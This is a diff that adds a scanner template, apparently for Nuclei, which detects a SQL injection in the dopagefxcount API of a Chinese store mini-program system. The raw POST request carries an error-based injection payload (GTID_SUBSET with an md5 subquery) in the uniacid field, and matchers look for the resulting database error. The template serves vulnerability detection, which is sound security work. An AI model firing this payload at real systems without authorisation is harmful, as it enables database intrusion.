@@ -1,0 +1,40 @@
+id: poc-yaml-internet-wxapps-dopagefxcount-sqli
+info:
+  name: "万能门店小程序系统 dopagefxcount SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A SQL injection vulnerability exists in the 万能门店小程序系统 affecting the /api/wxapps/dopagefxcount endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/wxapps/dopagefxcount HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('{{t1}}')))),3119)-- 123&suid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SQLSTATE[HY000]"
+          - "Malformed GTID set specification"
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
